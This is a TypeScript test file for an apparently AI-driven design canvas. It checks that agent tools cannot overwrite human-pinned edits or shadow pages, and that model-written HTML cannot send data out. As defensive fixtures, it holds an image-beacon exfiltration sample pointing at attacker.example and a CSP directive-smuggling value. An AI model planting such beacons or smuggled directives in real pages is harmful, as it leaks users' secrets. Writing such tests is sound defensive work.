/**
 * Mysti - AI Coding Agent
 * Copyright (c) 2025 DeepMyst Inc. All rights reserved.
 *
 * Author: Baha Abunojaim <baha@deepmyst.com>
 * Website: https://www.deepmyst.com/mysti
 *
 * This file is part of Mysti, licensed under the Apache License, Version 2.0.
 * See the LICENSE file in the project root for full license terms.
 *
 * SPDX-License-Identifier: Apache-2.0
 *
 * Plan 27 lane E — the two defects on the canvas's *compat* write surface.
 * Both matter more than their tier suggests: `insert_page` / `edit_page` are
 * what the fenced `canvas-op` prompt TEACHES, and that lane is the only canvas
 * write path for 13 of the 14 CLI backends.
 *
 *  - **E-1** `edit_page` with a content patch reached `ArtifactStore.updatePage`
 *    with NO pin enforcement — `page.doc` was replaced wholesale, so every
 *    human pin and the hand edit it records vanished while the tool answered
 *    `ok: true` with no `pinned` and no `dropped`. `write_page` refuses exactly
 *    this. Same finding, second half: `insert_page` took a writer-supplied `id`
 *    verbatim, so a page could be spliced in carrying a LIVE page's id and,
 *    at index 0, shadow the human's artboard for every later `getPage`.
 *  - **E-2** a model-authored `mode:'html'` artboard renders RAW under
 *    `SANDBOX_INNER_CSP`, whose `img-src … https:` matched every host on the
 *    internet — a GET beacon in a coordinator that has no bash, no fetch and
 *    no MCP tool by default.
 */
import { describe, it, expect, beforeEach } from 'vitest';
import { ArtifactStore } from '../../src/managers/ArtifactStore';
import { CanvasJobRouter } from '../../src/managers/CanvasJobRouter';
import { CanvasOpExecutor } from '../../src/managers/CanvasOpExecutor';
import { dispatchCanvasTool, type CanvasToolContext } from '../../src/managers/CanvasToolDispatch';
import {
  SANDBOX_INNER_CSP,
  buildPageDocument,
} from '../../src/managers/CanvasSandbox';
import { getThemePreset } from '../../src/managers/CanvasThemePresets';
import { getFormat } from '../../src/managers/CanvasFormats';
import { findNode, pinnedCells, walk, type DocNode, type Mid } from '../../src/canvas/doc/DocNode';
import { PIN_MARKER } from '../../src/canvas/doc/DocEmitter';
import type { CanvasArtifact } from '../../src/types';

const PAGE_SRC = `function Page() {
  return (
    <UI.Screen>
      <UI.Heading>Hero headline</UI.Heading>
      <UI.Text>Body copy</UI.Text>
    </UI.Screen>
  );
}`;

const REWRITE_SRC = `function Page() {
  return (
    <UI.Screen>
      <UI.Heading>AGENT HEADLINE</UI.Heading>
      <UI.Text>Agent copy</UI.Text>
    </UI.Screen>
  );
}`;

interface Harness {
  store: ArtifactStore;
  executor: CanvasOpExecutor;
  artifact: CanvasArtifact;
  ctx: CanvasToolContext;
}

function harness(): Harness {
  const store = new ArtifactStore({ getRoot: () => null });
  const executor = new CanvasOpExecutor(store, new CanvasJobRouter(() => {}));
  const artifact = store.createArtifact({ name: 'Design' });
  return {
    store, executor, artifact,
    ctx: { artifact, store, executor, jobId: 'job-1', runId: 'run-1', approvalMode: 'auto' },
  };
}

function seedPage(h: Harness, src = PAGE_SRC): string {
  return h.store.insertPage(h.artifact, h.store.makePage({ mode: 'jsx', jsxSource: src })).id;
}

function doc(h: Harness, pageId: string): DocNode {
  return h.store.getPage(h.artifact, pageId)!.doc;
}

function firstTextMid(h: Harness, pageId: string): Mid {
  return [...walk(doc(h, pageId))].find(n => n.text !== undefined)!.mid;
}

/** The human types into a cell through the inspector's own op — which pins it. */
function humanSetText(h: Harness, pageId: string, mid: Mid, text: string): void {
  const r = h.executor.submitOp(
    h.artifact,
    { op: { op: 'el.setText', pageId, mid, text }, runId: 'human', author: 'user' },
    'job-1',
    'auto',
  );
  expect(r.status).toBe('applied');
}

/* ══════════════════════════════════ E-1 ═══════════════════════════════ */

describe('E-1 — edit_page is pin-checked, like the write_page it competes with', () => {
  let h: Harness;
  beforeEach(() => { h = harness(); });

  it('refuses a whole-artboard rewrite that would destroy a human-owned cell', () => {
    const pageId = seedPage(h);
    const hero = firstTextMid(h, pageId);
    humanSetText(h, pageId, hero, 'HUMAN COPY');
    expect(pinnedCells(findNode(doc(h, pageId), hero)!)).toEqual(['text']);

    const res = dispatchCanvasTool(
      'edit_page',
      { pageId, patch: { mode: 'jsx', jsxSource: REWRITE_SRC } },
      h.ctx,
    );

    expect(res.ok).toBe(false);
    // The refusal names the pins, so the model can act on it rather than retry.
    expect(res.error).toContain(`${hero}:text`);
    // (the legacy `submit` wrapper in CanvasToolDispatch does not attach the
    // receipt to its result — the executor's own is the one that carries it)
    expect(h.executor.lastReceipt()?.pinned).toEqual([`${hero}:text`]);
    expect(h.executor.lastReceipt()?.status).toBe('rejected');
    // And nothing moved: the human's text, the mid and the pin all survive.
    const node = findNode(doc(h, pageId), hero);
    expect(node?.text).toBe('HUMAN COPY');
    expect(pinnedCells(node!)).toEqual(['text']);
  });

  it('agrees with write_page: the supported rewrite refuses the same edit', () => {
    const pageId = seedPage(h);
    const hero = firstTextMid(h, pageId);
    humanSetText(h, pageId, hero, 'HUMAN COPY');

    const supported = dispatchCanvasTool('write_page', { pageId, jsx: REWRITE_SRC, replace: true }, h.ctx);
    const compat = dispatchCanvasTool('edit_page', { pageId, patch: { mode: 'jsx', jsxSource: REWRITE_SRC } }, h.ctx);
    expect(supported.ok).toBe(false);
    expect(compat.ok).toBe(false);
  });

  it('an html rewrite is refused too — mode is not an escape hatch', () => {
    const pageId = seedPage(h);
    const hero = firstTextMid(h, pageId);
    humanSetText(h, pageId, hero, 'HUMAN COPY');

    const res = dispatchCanvasTool(
      'edit_page',
      { pageId, patch: { mode: 'html', htmlSource: '<div>AGENT</div>' } },
      h.ctx,
    );
    expect(res.ok).toBe(false);
    expect(findNode(doc(h, pageId), hero)?.text).toBe('HUMAN COPY');
    expect(h.store.getPage(h.artifact, pageId)!.legacy).toBeUndefined();
  });

  it('still applies a rewrite when nothing is pinned, and a metadata patch always', () => {
    const pageId = seedPage(h);
    const rewrite = dispatchCanvasTool('edit_page', { pageId, patch: { mode: 'jsx', jsxSource: REWRITE_SRC } }, h.ctx);
    expect(rewrite.ok).toBe(true);
    expect([...walk(doc(h, pageId))].some(n => n.text === 'AGENT HEADLINE')).toBe(true);

    const hero = firstTextMid(h, pageId);
    humanSetText(h, pageId, hero, 'HUMAN COPY');
    const meta = dispatchCanvasTool('edit_page', { pageId, patch: { actionTitle: 'Pricing' } }, h.ctx);
    expect(meta.ok).toBe(true);
    expect(h.store.getPage(h.artifact, pageId)!.actionTitle).toBe('Pricing');
  });

  it('a pin that SURVIVES the rewrite keeps its record (ownership is not laundered)', () => {
    const pageId = seedPage(h);
    const hero = firstTextMid(h, pageId);
    humanSetText(h, pageId, hero, 'HUMAN COPY');

    // A doc patch that carries the human's node forward unchanged: same mid,
    // same tag, same text. It must apply AND leave the human owning the cell.
    const next: DocNode = JSON.parse(JSON.stringify(doc(h, pageId)));
    for (const n of walk(next)) { delete n.pins; }

    const res = dispatchCanvasTool('edit_page', { pageId, patch: { doc: next } }, h.ctx);
    expect(res.ok).toBe(true);
    const node = findNode(doc(h, pageId), hero);
    expect(node?.text).toBe('HUMAN COPY');
    expect(pinnedCells(node!)).toEqual(['text']);
    // …and the cache the model READS pins from is refreshed with it, or
    // `get_page_jsx` would report the cell as free and the next agent turn
    // would be refused by a pin it was never shown.
    expect(h.store.getPage(h.artifact, pageId)!.jsxCache).toContain(PIN_MARKER);
  });

  it('a HUMAN edit_page is never pin-gated — a human may overrule their own pin', () => {
    const pageId = seedPage(h);
    const hero = firstTextMid(h, pageId);
    humanSetText(h, pageId, hero, 'HUMAN COPY');

    const op = h.executor.submit(
      h.artifact,
      { kind: 'edit_page', targetPageId: pageId, runId: 'human', author: 'user', proposedValue: { mode: 'jsx', jsxSource: REWRITE_SRC } },
      'job-1',
      'auto',
    );
    expect(op?.status).toBe('applied');
    expect([...walk(doc(h, pageId))].some(n => n.text === 'AGENT HEADLINE')).toBe(true);
  });

  it('insert_page cannot reuse a live page id and shadow the human\'s artboard', () => {
    const pageId = seedPage(h);
    const hero = firstTextMid(h, pageId);
    humanSetText(h, pageId, hero, 'HUMAN COPY');

    const res = dispatchCanvasTool(
      'insert_page',
      { page: { id: pageId, index: 0, mode: 'jsx', jsxSource: REWRITE_SRC } },
      h.ctx,
    );

    expect(res.ok).toBe(true);
    expect(h.artifact.pages).toHaveLength(2);
    // No two pages share an id, so `getPage` still resolves to the human's.
    expect(new Set(h.artifact.pages.map(p => p.id)).size).toBe(2);
    expect(res.op?.targetPageId).not.toBe(pageId);
    const resolved = h.store.getPage(h.artifact, pageId)!;
    expect(findNode(resolved.doc, hero)?.text).toBe('HUMAN COPY');
  });
});

/* ══════════════════════════════════ E-2 ═══════════════════════════════ */

describe('E-2 — a legacy html artboard is not an outbound-network channel', () => {
  const theme = getThemePreset('clean-saas')!.theme;
  const format = getFormat('desktop')!;

  it('the legacy inner CSP carries no scheme-source for images or fonts', () => {
    expect(SANDBOX_INNER_CSP).toContain('img-src data: blob:;');
    expect(SANDBOX_INNER_CSP).toContain('font-src data:;');
    expect(SANDBOX_INNER_CSP).not.toContain('https:');
  });

  it('a model-authored html page still renders, but its beacon cannot fire', () => {
    const store = new ArtifactStore({ getRoot: () => null });
    const artifact = store.createArtifact({ name: 'x', kind: 'screens', theme });
    // Exactly what `insert_page {page:{mode:'html',…}}` produces.
    const page = store.makePage({
      mode: 'html',
      htmlSource: '<img src="https://attacker.example/?leak=SECRET">',
    } as never);
    expect(page.legacy).toEqual({ mode: 'html', source: '<img src="https://attacker.example/?leak=SECRET">' });

    const built = buildPageDocument({
      page, theme, format,
      // The BOARD's runtime shape: script CONTENTS, not srcs.
      runtime: { headScripts: ['/*react*/'], harness: '/*harness*/' },
      nonce: 'abc',
    });

    expect(built).toContain('data-mode="html"');
    expect(built).toContain('img-src data: blob:;');
    expect(built).not.toContain('img-src data: blob: https:');
  });

  it('the webview\'s own asset origin still paints, because the HOST names it', () => {
    const store = new ArtifactStore({ getRoot: () => null });
    store.createArtifact({ name: 'x', kind: 'screens', theme });
    const page = store.makePage({ mode: 'html', htmlSource: '<img src="asset://a/x.png">' } as never);

    const built = buildPageDocument({
      page, theme, format,
      runtime: { headScripts: ['/*react*/'], harness: '/*harness*/' },
      nonce: 'abc',
      // What app.ts passes: `assetCspSource(boot.assetBaseUri)`.
      imgSources: ['https://*.vscode-resource.vscode-cdn.net'],
    });

    expect(built).toContain('img-src data: blob: https://*.vscode-resource.vscode-cdn.net;');
    // A named origin is not a wildcard: the beacon host is still refused.
    expect(built).not.toContain('img-src data: blob: https:;');
  });

  it('imgSources is host-named and validated — a payload cannot smuggle a directive', () => {
    const store = new ArtifactStore({ getRoot: () => null });
    store.createArtifact({ name: 'x', kind: 'screens', theme });
    const page = store.makePage({ mode: 'html', htmlSource: '<div/>' } as never);

    const built = buildPageDocument({
      page, theme, format,
      runtime: { headScripts: ['/*react*/'], harness: '/*harness*/' },
      nonce: 'abc',
      imgSources: ["x; script-src 'unsafe-eval'", 'has space', '"quoted"', 'https://ok.example'],
    });

    expect(built).toContain('img-src data: blob: https://ok.example;');
    expect(built).not.toContain('has space');
    expect(built).not.toContain('&quot;quoted&quot;');
  });
});
